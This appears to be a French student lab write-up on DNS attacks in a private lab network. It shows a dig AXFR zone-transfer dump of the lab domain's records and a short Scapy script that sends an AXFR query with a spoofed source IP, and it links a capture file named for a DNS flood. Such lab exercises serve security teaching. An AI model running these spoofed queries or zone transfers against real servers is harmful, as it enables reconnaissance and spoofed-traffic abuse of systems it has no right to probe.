### 1. DNS
🌞 **Requêter l'enregistrement AXFR**
-> permet de récupérer tous les enregistrements DNS d'un domaine donné (pas très sécurisé si c'est activé)
```
[toto@localhost ~]$ dig axfr @dns.tp3.b2 tp3.b2

; <<>> DiG 9.16.23-RH <<>> axfr @dns.tp3.b2 tp3.b2
; (1 server found)
;; global options: +cmd
tp3.b2. 86400 IN SOA dns.tp3.b2. admin.tp3.b2. 2019061800 3600 1800 604800 86400
tp3.b2. 86400 IN NS dns.tp3.b2. 
coolsite.tp3.b2. 86400 IN A 10.3.3.4 
dns.tp3.b2. 86400 IN A 10.3.3.1 
meow.tp3.b2. 86400 IN A 10.3.3.6 
prout.tp3.b2. 86400 IN A 10.3.3.5 
supersite.tp3.b2. 86400 IN A 10.3.3.3 
web.tp3.b2. 86400 IN A 10.3.3.2 
web2.tp3.b2. 86400 IN A 10.3.3.4 
web3.tp3.b2. 86400 IN A 10.3.3.5 
web4.tp3.b2. 86400 IN A 10.3.3.6 
tp3.b2. 86400 IN SOA dns.tp3.b2. admin.tp3.b2. 2019061800 3600 1800 604800 86400
```

🌞 **Spoof DNS query**
```
from scapy.all import *

answer = sr1(IP(dst="dns.tp3.b2", src="10.3.2.10")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="tp3.b2", qtype="AXFR")),verbose=0)

print(answer[DNS].summary()) # évidement on aura pas de réponse sur la machine attaquante
```
	
[DNS spoof query](dns_flood.pcapng)

